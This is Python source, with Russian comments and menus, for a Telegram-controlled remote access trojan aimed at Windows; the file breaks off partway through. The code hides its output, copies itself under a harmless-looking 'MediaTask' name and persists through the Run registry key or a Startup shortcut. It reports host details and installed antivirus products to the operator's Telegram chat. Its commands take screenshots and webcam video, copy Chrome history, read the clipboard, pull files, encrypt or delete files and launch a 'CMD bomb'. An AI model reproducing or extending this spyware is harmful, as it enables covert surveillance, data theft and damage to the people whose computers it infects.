from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import ContentType
from aiogram.types import FSInputFile
from aiogram import Bot, Dispatcher, types, F
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

import psutil
import ctypes
import wmi
import asyncio
import os
from PIL import ImageGrab
import pyautogui
import cv2
import datetime
import time
import pygetwindow as gw
import pyperclip
import pyaudio
import wave
import sqlite3
import webbrowser
import logging
import platform
import getpass
import subprocess
import socket
import requests
import aiohttp
import sys
import shutil
import GPUtil
import winreg
import json
import base64

from config import ALLOWED_USER_ID, API_TOKEN
from pathlib import Path

# ===== КОНФИГУРАЦИЯ ДЕЦЕНТРАЛИЗОВАННОЙ СИСТЕМЫ =====

pc_manager = None
PC_DB_FILE = "C:/Users/Public/main/pc_database.json"

class TelegramPCManager:
    def __init__(self, bot):
        self.bot = bot
        self.storage_chat_id = ALLOWED_USER_ID
    
    async def update_pc_info(self, pc_info):
        try:
            pc_info['telegram_updated'] = time.time()
            pc_data = base64.b64encode(json.dumps(pc_info).encode()).decode()
            message_text = f"PC_DATA:{pc_data}"
            await self.bot.send_message(self.storage_chat_id, message_text)
            return True
        except Exception as e:
            return False
    
    async def get_all_pcs(self):
        try:
            all_pcs = {}
            current_time = time.time()
            
            async for message in self.bot.get_chat_history(self.storage_chat_id, limit=100):
                if message.text and message.text.startswith("PC_DATA:"):
                    try:
                        pc_data_encoded = message.text[8:]
                        pc_info = json.loads(base64.b64decode(pc_data_encoded).decode())
                        pc_id = pc_info.get('pc_id')
                        
                        if not pc_id:
                            continue
                            
                        telegram_updated = pc_info.get('telegram_updated', 0)
                        if current_time - telegram_updated > 3600:
                            continue
                            
                        last_seen = pc_info.get('last_seen', 0)
                        if current_time - last_seen < 300:
                            pc_info['status'] = 'online'
                        else:
                            pc_info['status'] = 'offline'
                        
                        if pc_id not in all_pcs:
                            all_pcs[pc_id] = pc_info
                        else:
                            current_update = all_pcs[pc_id].get('telegram_updated', 0)
                            new_update = pc_info.get('telegram_updated', 0)
                            if new_update > current_update:
                                all_pcs[pc_id] = pc_info
                                
                    except Exception:
                        continue
            
            return all_pcs
            
        except Exception:
            return {}

def init_pc_manager(bot_instance):
    global pc_manager
    pc_manager = TelegramPCManager(bot_instance)

def load_pc_database():
    try:
        if os.path.exists(PC_DB_FILE):
            with open(PC_DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception:
        pass
    return {}

def save_pc_database(db):
    try:
        os.makedirs(os.path.dirname(PC_DB_FILE), exist_ok=True)
        with open(PC_DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(db, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def get_pc_unique_id():
    hostname = socket.gethostname()
    username = getpass.getuser()
    return f"{hostname}_{username}"

def get_pc_info():
    hostname = socket.gethostname()
    username = getpass.getuser()
    
    try:
        local_ip = socket.gethostbyname(hostname)
    except:
        local_ip = "Unknown"
    
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        public_ip = "Unknown"
    
    return {
        "pc_id": get_pc_unique_id(),
        "pc_name": hostname,
        "username": username,
        "local_ip": local_ip,
        "public_ip": public_ip,
        "status": "online",
        "last_seen": time.time(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu_cores": psutil.cpu_count(logical=False),
        "ram_gb": round(psutil.virtual_memory().total / (1024**3), 1),
        "telegram_updated": time.time()
    }

async def register_current_pc():
    pc_info = get_pc_info()
    
    if pc_manager:
        await pc_manager.update_pc_info(pc_info)
    
    db = load_pc_database()
    db[pc_info["pc_id"]] = pc_info
    save_pc_database(db)
    
    return pc_info

async def get_all_pcs_sync():
    cloud_pcs = {}
    
    if pc_manager:
        try:
            cloud_pcs = await pc_manager.get_all_pcs()
            if cloud_pcs:
                save_pc_database(cloud_pcs)
                return cloud_pcs
        except Exception:
            pass
    
    local_db = load_pc_database()
    current_time = time.time()
    for pc_id, pc_info in local_db.items():
        last_seen = pc_info.get('last_seen', 0)
        if current_time - last_seen < 300:
            pc_info['status'] = 'online'
        else:
            pc_info['status'] = 'offline'
    
    return local_db

def get_online_pcs(all_pcs):
    return {pc_id: pc_info for pc_id, pc_info in all_pcs.items() 
            if pc_info.get("status") == "online"}

# ===== БАЗОВАЯ КОНФИГУРАЦИЯ =====

destination_folder = r'C:\ProgramData\MediaTask'
os.makedirs(destination_folder, exist_ok=True)

directory = "C:/Users/Public/main"
os.makedirs(directory, exist_ok=True)

def extract_file(resource_name, output_path):
    if not os.path.exists(output_path):
        current_dir = Path(__file__).resolve().parent
        resource_path = current_dir / resource_name
        if resource_path.exists():
            shutil.copy(resource_path, output_path)
        else:
            raise FileNotFoundError(f'Resource {resource_path} not found')

if __name__ == '__main__':
    resource_name = 'my_image.ico'
    output_path = directory + '/my_image.ico'
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    extract_file(resource_name, output_path)

def copy_and_rename(destination_folder, new_name, icon_path=None):
    new_file_path = os.path.join(destination_folder, new_name)
    if os.path.exists(new_file_path):
        return "Файл уже существует. Копирование не требуется."
    
    current_file = sys.argv[0]
    try:
        shutil.copy(current_file, new_file_path)
        if icon_path:
            rcedit_path = r'C:\path\to\rcedit.exe'
            subprocess.run([rcedit_path, new_file_path, '--set-icon', icon_path], check=True)
        return f"Файл успешно скопирован в {new_file_path} и иконка обновлена"
    except Exception as e:
        return f"Ошибка при копировании: {e}"

if __name__ == "__main__":
    destination_folder = r'C:\ProgramData\MediaTask'
    new_name = 'MediaTask.exe'
    icon_path = directory + '/my_image.ico'
    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)
    result = copy_and_rename(destination_folder, new_name, icon_path)

def add_to_registry(script_path):
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "MediaTask", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg_key)
        return True
    except Exception:
        return False

def add_to_startup_folder(script_path):
    try:
        startup_folder = os.path.join(os.getenv('APPDATA'), 
                                    r"Microsoft\Windows\Start Menu\Programs\Startup")
        shortcut_name = "MediaTask.lnk"
        shortcut_path = os.path.join(startup_folder, shortcut_name)
        
        if os.path.exists(shortcut_path):
            return
            
        os.system(f'powershell -Command "$s = (New-Object -COM WScript.Shell).CreateShortcut(\'{shortcut_path}\'); $s.TargetPath=\'{script_path}\'; $s.Save()"')
    except Exception:
        pass

if __name__ == "__main__":
    script_path = 'C:\\ProgramData\\MediaTask\\MediaTask.exe'
    if not add_to_registry(script_path):
        add_to_startup_folder(script_path)

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

logging.basicConfig(level=logging.CRITICAL + 1)
logging.getLogger('aiogram').disabled = True

# ===== ИНИЦИАЛИЗАЦИЯ БОТА =====

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

MAX_MESSAGE_LENGTH = 4096

# ===== КЛАВИАТУРЫ =====

def get_main_keyboard():
    kb = [
        [types.KeyboardButton(text="Антивирус"), types.KeyboardButton(text="Скриншот")],
        [types.KeyboardButton(text="Процесы"), types.KeyboardButton(text="Фото с камеры")],
        [types.KeyboardButton(text="Полный отчет по процесам"), types.KeyboardButton(text="Завершить процесс")],
        [types.KeyboardButton(text="Создать папку"), types.KeyboardButton(text="Удалить папку")],
        [types.KeyboardButton(text="Содержание директории"), types.KeyboardButton(text="Переместиться по директории")],
        [types.KeyboardButton(text="Данные ПК"), types.KeyboardButton(text="Диагностика сети")],
        [types.KeyboardButton(text="Запись с веб камеры"), types.KeyboardButton(text="Запись аудио")],
        [types.KeyboardButton(text="Открыть файл"), types.KeyboardButton(text="Загрузить файл")],
        [types.KeyboardButton(text="Скачать файл"), types.KeyboardButton(text="Удалить файл")],
        [types.KeyboardButton(text="Зашифровать файл"), types.KeyboardButton(text="Расшифровать файл")],
        [types.KeyboardButton(text="История хрома"), types.KeyboardButton(text="История оперы")],
        [types.KeyboardButton(text="ALT + F4"), types.KeyboardButton(text="Свернуть все окна")],
        [types.KeyboardButton(text="Посмотреть буфер обмена"), types.KeyboardButton(text="Изменить буфер обмена")],
        [types.KeyboardButton(text="Закрыть диспетчер задач"), types.KeyboardButton(text="Открыть ссылку")],
        [types.KeyboardButton(text="Включить звук"), types.KeyboardButton(text="Выключить звук")],
        [types.KeyboardButton(text="Звук на 100%"), types.KeyboardButton(text="CMD бомба")],
        [types.KeyboardButton(text="Выключить ПК"), types.KeyboardButton(text="Перезагрузить ПК")],
        [types.KeyboardButton(text="Перемистить файл"), types.KeyboardButton(text="Поменять обои")],
        [types.KeyboardButton(text="Самоуничтожение"), types.KeyboardButton(text="📊 Мои ПК")],
    ]
    return types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def get_pc_management_keyboard():
    kb = [
        [types.KeyboardButton(text="🔄 Обновить список")],
        [types.KeyboardButton(text="❌ Очистить базу")],
        [types.KeyboardButton(text="📊 Статистика")],
        [types.KeyboardButton(text="🏠 Главное меню")]
    ]
    return types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

# ===== ОСНОВНЫЕ ХЭНДЛЕРЫ =====

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        if pc_manager is None:
            init_pc_manager(bot)
        
        pc_info = await register_current_pc()
        all_pcs = await get_all_pcs_sync()
        online_pcs = get_online_pcs(all_pcs)
        
        await message.answer(
            f"🤖 **Бот запущен на ПК:** {pc_info['pc_name']}\n"
            f"👤 Пользователь: {pc_info['username']}\n"
            f"🌐 Локальный IP: {pc_info['local_ip']}\n"
            f"💻 ОС: {pc_info['os']}\n"
            f"⚙️ CPU: {pc_info['cpu_cores']} ядер | RAM: {pc_info['ram_gb']} GB\n\n"
            f"📊 **Известно ПК:** {len(all_pcs)} | 🟢 **Онлайн:** {len(online_pcs)}\n\n"
            f"Используйте кнопку '📊 Мои ПК' для просмотра всех компьютеров",
            reply_markup=get_main_keyboard()
        )
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "📊 мои пк")
async def pc_management(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        all_pcs = await get_all_pcs_sync()
        online_pcs = get_online_pcs(all_pcs)
        
        if not all_pcs:
            await message.answer(
                "❌ База ПК пуста.\nЗапустите бота на других компьютерах с тем же ID пользователя.",
                reply_markup=get_main_keyboard()
            )
            return
        
        text = "📊 **Мои компьютеры:**\n\n"
        
        for i, (pc_id, pc_info) in enumerate(all_pcs.items(), 1):
            status_icon = "🟢" if pc_info.get("status") == "online" else "🔴"
            last_seen = datetime.datetime.fromtimestamp(pc_info.get("last_seen", 0)).strftime('%d.%m %H:%M')
            is_current = "(текущий)" if pc_id == get_pc_unique_id() else ""
            
            text += f"{i}. {status_icon} **{pc_info['pc_name']}** {is_current}\n"
            text += f"   👤 {pc_info['username']} | 🌐 {pc_info.get('local_ip', 'Unknown')}\n"
            text += f"   💻 {pc_info.get('os', 'Unknown')}\n"
            text += f"   ⏰ {last_seen} | 📍 {pc_info.get('status', 'unknown')}\n\n"
        
        text += f"📈 Статистика: 🟢 Онлайн: {len(online_pcs)} | 🔴 Оффлайн: {len(all_pcs) - len(online_pcs)} | Всего: {len(all_pcs)}"
        
        await message.answer(text, reply_markup=get_pc_management_keyboard())
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "🔄 обновить список")
async def refresh_pc_list(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        all_pcs = await get_all_pcs_sync()
        online_pcs = get_online_pcs(all_pcs)
        
        await message.answer(
            f"✅ Список обновлен!\n"
            f"📊 Статистика:\n"
            f"🟢 Онлайн: {len(online_pcs)}\n"
            f"🔴 Оффлайн: {len(all_pcs) - len(online_pcs)}\n"
            f"📈 Всего ПК: {len(all_pcs)}"
        )
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "📊 статистика")
async def show_statistics(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        all_pcs = await get_all_pcs_sync()
        online_pcs = get_online_pcs(all_pcs)
        
        os_stats = {}
        for pc_info in all_pcs.values():
            os_name = pc_info.get('os', 'Unknown')
            os_stats[os_name] = os_stats.get(os_name, 0) + 1
        
        os_text = "\n".join([f"• {os_name}: {count}" for os_name, count in os_stats.items()])
        
        user_stats = {}
        for pc_info in all_pcs.values():
            username = pc_info.get('username', 'Unknown')
            user_stats[username] = user_stats.get(username, 0) + 1
        
        user_text = "\n".join([f"• {username}: {count}" for username, count in user_stats.items()])
        
        text = (
            f"📈 **Статистика компьютеров:**\n\n"
            f"🖥️ Всего ПК: {len(all_pcs)}\n"
            f"🟢 Онлайн: {len(online_pcs)}\n"
            f"🔴 Оффлайн: {len(all_pcs) - len(online_pcs)}\n\n"
            f"💻 **Распределение по ОС:**\n{os_text}\n\n"
            f"👤 **По пользователям:**\n{user_text}"
        )
        
        await message.answer(text)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class ClearDatabaseState(StatesGroup):
    confirmation = State()

@dp.message(F.text.lower() == "❌ очистить базу")
async def clear_database_start(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        all_pcs = await get_all_pcs_sync()
        
        await message.answer(
            f"⚠️ **Внимание!**\n\n"
            f"Вы собираетесь очистить базу данных ПК.\n"
            f"Будет удалена информация о {len(all_pcs)} компьютерах.\n\n"
            f"Для подтверждения введите: **ДА**\n"
            f"Для отмены введите любой другой текст"
        )
        await state.set_state(ClearDatabaseState.confirmation)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(ClearDatabaseState.confirmation)
async def clear_database_confirm(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        if message.text.upper() == "ДА":
            current_pc = get_pc_info()
            new_db = {current_pc["pc_id"]: current_pc}
            save_pc_database(new_db)
            
            await message.answer("✅ База данных очищена. Сохранен только текущий ПК.")
        else:
            await message.answer("❌ Очистка базы отменена.")
        
        await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "🏠 главное меню")
async def main_menu(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer("Возвращаюсь в главное меню:", reply_markup=get_main_keyboard())
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

# ===== СУЩЕСТВУЮЩИЕ ХЭНДЛЕРЫ =====

@dp.message(F.text.lower() == "антивирус")
async def cmd_antivirus(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        
        def get_antivirus_programs():
            c = wmi.WMI(namespace="root/SecurityCenter2")
            antivirus_products = c.AntiVirusProduct()
            return [product.displayName for product in antivirus_products]

        antivirus_programs = get_antivirus_programs()
        if antivirus_programs:
            response = "🛡️ **Установленные антивирусные программы:**\n" + "\n".join(f"• {program}" for program in antivirus_programs)
        else:
            response = "❌ Антивирусные программы не обнаружены"
        
        await message.answer(response)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "скриншот")
async def send_photo(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer('Сейчас будет скриншот...')
        
        screenshot = ImageGrab.grab()
        filename = "screenshot.png"
        filepath = os.path.join(directory, filename)

        screenshot.save(filepath)
        photo = FSInputFile(filepath)
        await message.answer_photo(photo)

        if os.path.exists(filepath):
            os.remove(filepath)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "фото с камеры")
async def send_photo(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer('Делаю фото с камеры...')
        
        filename = "snapshot.png"
        filepath = os.path.join(directory, filename)

        try:
            camera = cv2.VideoCapture(0)
            if not camera.isOpened():
                raise RuntimeError("Не удалось открыть камеру")

            ret, frame = camera.read()
            if not ret:
                raise RuntimeError("Не удалось сделать снимок")

            cv2.imwrite(filepath, frame)
            photo = FSInputFile(filepath)
            await message.answer_photo(photo, caption="Вот ваше фото с веб-камеры!")

        except Exception as e:
            await message.answer(f"Произошла ошибка при попытке сделать фото: {e}")

        finally:
            if 'camera' in locals() and camera.isOpened():
                camera.release()

            if os.path.exists(filepath):
                os.remove(filepath)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "процесы")
async def cmd_processes(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()

        process_info_list = []
        for process in psutil.process_iter(['pid', 'name']):
            process_info = f"PID: {process.info['pid']}, {process.info['name']}"
            process_info_list.append(process_info)

        all_processes_info = "\n".join(process_info_list)

        for i in range(0, len(all_processes_info), MAX_MESSAGE_LENGTH):
            await message.answer(all_processes_info[i:i + MAX_MESSAGE_LENGTH])
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "полный отчет по процесам")
async def cmd_full_processes(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()

        process_info_list = []
        for process in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
            process_info = (
                f"PID: {process.info['pid']}, Name: {process.info['name']}, "
                f"User: {process.info['username']}, CPU: {process.info['cpu_percent']}%, "
                f"Memory: {process.info['memory_info'].rss / (1024 * 1024):.2f} MB"
            )
            process_info_list.append(process_info)

        all_processes_info = "\n".join(process_info_list)

        for i in range(0, len(all_processes_info), MAX_MESSAGE_LENGTH):
            await message.answer(all_processes_info[i:i + MAX_MESSAGE_LENGTH])
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class ProcessState(StatesGroup):
    waiting_for_pid = State()

@dp.message(F.text.lower() == "завершить процесс")
async def cmd_andprocesses(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Укажите PID процесса.")
        await state.set_state(ProcessState.waiting_for_pid)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(ProcessState.waiting_for_pid)
async def process_pid(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        user_input = message.text

        if not user_input.isdigit():
            await message.answer(f"{user_input} - Не является PID.")
            await state.clear()
            return

        pid = int(user_input)

        try:
            process = psutil.Process(pid)
            process.terminate()
            process.wait(timeout=3)
            await message.answer(f"Процесс с PID {pid} успешно завершен.")
        except psutil.NoSuchProcess:
            await message.answer(f"Процесс с PID {pid} не найден.")
        except psutil.AccessDenied:
            await message.answer(f"Недостаточно прав для завершения процесса с PID {pid}.")
        except psutil.TimeoutExpired:
            await message.answer(f"Процесс с PID {pid} не завершился за отведенное время. Принудительное завершение.")
            process.kill()
            await message.answer(f"Процесс с PID {pid} принудительно завершен.")
        
        await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class Form(StatesGroup):
    folder_name = State()

@dp.message(F.text.lower() == "создать папку")
async def create_folder_command(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Укажите путь где создать папку и вконце название папки, пример:\n C:/Users/Public/Название_папки")
        await state.set_state(Form.folder_name)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(Form.folder_name)
async def process_folder_name(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        folder_name = message.text

        if os.path.dirname(folder_name):
            if not os.path.exists(folder_name):
                os.makedirs(folder_name, exist_ok=True)
                await message.answer(f"Папка '{folder_name}' успешно создана!")
                await state.clear()
            else:
                await message.answer(f"Папка с именем '{folder_name}' уже существует!")
                await state.clear()
        else:
            await message.answer("Пожалуйста, укажите полный путь к папке, а не только её название.")
            await message.answer("Попробуйте снова. Перезапустив процесс.")
            await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class waiting(StatesGroup):
    folder_name_delet = State()

@dp.message(F.text.lower() == "удалить папку")
async def delet_folder_command(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Укажите путь и вконце название папки, пример:\n C:/Users/Public/Название_папки\n!!!Папка удаляется со всем содержимым!!!")
        await state.set_state(waiting.folder_name_delet)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

incorrect_attempts = {}

@dp.message(waiting.folder_name_delet)
async def processdelet_folder_name(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    folder_name_delet = message.text

    if user_id not in incorrect_attempts:
        incorrect_attempts[user_id] = 0

    if message.from_user.id == ALLOWED_USER_ID:
        if os.path.exists(folder_name_delet) and os.path.isdir(folder_name_delet):
            try:
                shutil.rmtree(folder_name_delet)
                await message.answer(f"Папка '{folder_name_delet}' и все её содержимое успешно удалены.")
                await state.set_state(None)
                incorrect_attempts[user_id] = 0
            except Exception as e:
                await message.answer(f"Ошибка при удалении папки: {e}")
                await state.set_state(None)
        else:
            incorrect_attempts[user_id] += 1
            if incorrect_attempts[user_id] >= 1:
                await message.answer(f"Папка '{folder_name_delet}' не найдена. Пожалуйста, введите корректный путь к папке")
                await message.answer("Попробуйте снова. Перезапустив процесс.")
                await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class waitingfile(StatesGroup):
    file_name_send = State()

@dp.message(F.text.lower() == "скачать файл")
async def send_file(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Укажите путь и расширение файла, пример:\n C:/Users/Public/Название_файла.txt")
        await state.set_state(waitingfile.file_name_send)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(waitingfile.file_name_send)
async def process_send_file(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        directory_file = message.text

        try:
            if not os.path.isfile(directory_file):
                await message.answer("Файл не найден. Проверьте путь и попробуйте снова.")
                await state.clear()
                return

            file_size = os.path.getsize(directory_file)
            max_size = 50 * 1024 * 1024

            if file_size > max_size:
                await message.answer(f"Файл слишком большой ({file_size / (1024 * 1024):.2f} MB). Максимальный размер файла - 50 MB.")
                await state.clear()
                return

            document = FSInputFile(directory_file)
            await message.answer_document(document)
            await state.clear()
        except Exception as e:
            await message.answer(f"Произошла ошибка: {e}\n")
            await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class waitmas(StatesGroup):
    file_name_delet = State()

@dp.message(F.text.lower() == "удалить файл")
async def send_file(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Укажите путь и расширение файла которого хотите удалить, пример:\n C:/Users/Public/Название_файла.txt")
        await state.set_state(waitmas.file_name_delet)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(waitmas.file_name_delet)
async def process_send_file(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        directory_file_delet = message.text
        if os.path.exists(directory_file_delet):
            os.remove(directory_file_delet)
            await message.answer(f"Файл '{directory_file_delet}' успешно удален.")
        else:
            await message.answer(f"Файл '{directory_file_delet}' не был найден.")
        await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

current_directory = "C:/"

class DirectoryState(StatesGroup):
    waiting_for_directory = State()

@dp.message(F.text == "Содержание директории")
async def show_directory_content(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        global current_directory
        try:
            files_and_dirs = os.listdir(current_directory)
            content = []
            for item in files_and_dirs:
                full_path = os.path.join(current_directory, item)
                if os.path.isfile(full_path):
                    size = os.path.getsize(full_path)
                    content.append(f"{item}  -  {size / (1024 * 1024):.2f} MB")
                else:
                    content.append(f"{item}")
            if content:
                content_text = "\n".join(content)
            else:
                content_text = "Папка пуста"
        except Exception as e:
            content_text = f"Ошибка: {str(e)}"

        await message.answer(f"Содержание директории '{current_directory}':\n{content_text}")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text == "Переместиться по директории")
async def change_directory(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Введите путь к новой директории:")
        await state.set_state(DirectoryState.waiting_for_directory)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(DirectoryState.waiting_for_directory)
async def set_new_directory(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        global current_directory
        new_directory = message.text

        if os.path.isdir(new_directory):
            current_directory = new_directory
            await message.answer(f"Успешно переместился, вот текущая директория:\n{current_directory}")
        else:
            await message.answer("Неверный путь. Попробуйте снов.")

        await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "история хрома")
async def cmd_chrome_history(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        
        def get_chrome_history():
            history_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History')

            if not os.path.exists(history_path):
                return False, "Файл истории Chrome не найден."

            temp_history_path = 'temp_history'
            shutil.copy2(history_path, temp_history_path)

            conn = sqlite3.connect(temp_history_path)
            cursor = conn.cursor()

            query = """
            SELECT urls.url, urls.title, urls.last_visit_time
            FROM urls
            ORDER BY last_visit_time DESC
            """
            cursor.execute(query)

            rows = cursor.fetchall()

            text_to_save = ""

            for row in rows:
                url = row[0]
                title = row[1]
                last_visit_time = row[2]

                try:
                    if last_visit_time > 0:
                        last_visit_time = last_visit_time / 1000000 - 11644473600
                        last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
                    else:
                        last_visit_time = 'Invalid time'
                except (OSError, ValueError) as e:
                    last_visit_time = f'Error: {str(e)}'

                text_to_save += f"URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n"

            file_path = os.path.join(directory, 'История_Хрома.txt')

            with open(file_path, 'w', encoding='utf-8') as file:
                file.write(text_to_save)

            conn.close()
            os.remove(temp_history_path)

            return True, file_path

        await message.answer("Получение истории Chrome. Пожалуйста, подождите...")
        success, result = get_chrome_history()

        if not success:
            await message.answer(result)
            return

        file_path = result
        try:
            file_to_send = FSInputFile(file_path)
            await message.answer_document(document=file_to_send, caption="Вот ваш файл!")
        except Exception as e:
            await message.answer(f"Ошибка при отправке файла: {e}")
        os.remove(file_path)
    else:                       
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class webtime(StatesGroup):
    waiting_for_time = State()

@dp.message(F.text == "Запись с веб камеры")
async def web_record(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await state.clear()
        await message.answer("Укажите длительность записи в секундах")
        await state.set_state(webtime.waiting_for_time)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(webtime.waiting_for_time)
async def start_recording(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        file_path = os.path.join(directory, 'Видео_с_вебки.mp4')

        try:
            try:
                recording_time = int(message.text)
                if recording_time <= 0:
                    raise ValueError("Длительность записи должна быть положительным числом.")
            except ValueError:
                await message.answer("Пожалуйста, укажите правильную длительность в секундах.")
                return

            await message.answer("Запись началась 📹...")

            try:
                cap = cv2.VideoCapture(0)
                if not cap.isOpened():
                    raise RuntimeError("Камера занята другим процессом.")

                fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                out = cv2.VideoWriter(file_path, fourcc, 20.0, (640, 480))

                start_time = time.time()
                while int(time.time() - start_time) < recording_time:
                    ret, frame = cap.read()
                    if ret:
                        out.write(frame)
                    else:
                        break

                cap.release()
                out.release()
            except RuntimeError as e:
                await message.answer(f"Ошибка при доступе к камере: {e}")
                return
            except Exception as e:
                await message.answer(f"Ошибка при записи видео: {e}")
                return

            try:
                file_to_send = FSInputFile(file_path)
                await message.answer_video(file_to_send, caption="Вот запись с вебки!")
            except Exception as e:
                await message.answer(f"Ошибка при отправке видео: {e}")

        except Exception as e:
            await message.answer(f"Произошла ошибка при записи видео: {e}")

        finally:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except Exception as e:
                    await message.answer(f"Не удалось удалить файл {file_path}: {e}")
            await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "alt + f4")
async def cmd_alt_f4(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        pyautogui.hotkey('alt', 'f4')
        await message.answer("Окно было успешно закрыто✅")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "свернуть все окна")
async def cmd_minimize_windows(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        windows = gw.getAllWindows()
        for window in windows:
            if window.isMinimized == False:
                window.minimize()
        await message.answer("Окна были успешно свёрнуты✅")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class openfile(StatesGroup):
    waiting_for_dfile = State()

@dp.message(F.text.lower() == "открыть файл")
async def cmd_open_file(message: types.Message, state: FSMContext):
